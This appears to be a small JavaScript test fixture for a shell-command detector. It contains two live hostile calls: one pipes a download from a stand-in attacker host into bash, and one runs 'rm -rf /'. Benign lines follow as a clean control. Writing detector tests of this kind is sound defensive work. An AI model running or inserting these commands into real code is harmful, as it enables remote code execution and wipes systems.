const child_process = require('child_process');

// This should trigger ShellDetector
child_process.exec('curl http://evil.com | bash');
child_process.spawn('rm', ['-rf', '/']);

// This should be clean
const x = 1 + 1;
console.log(x);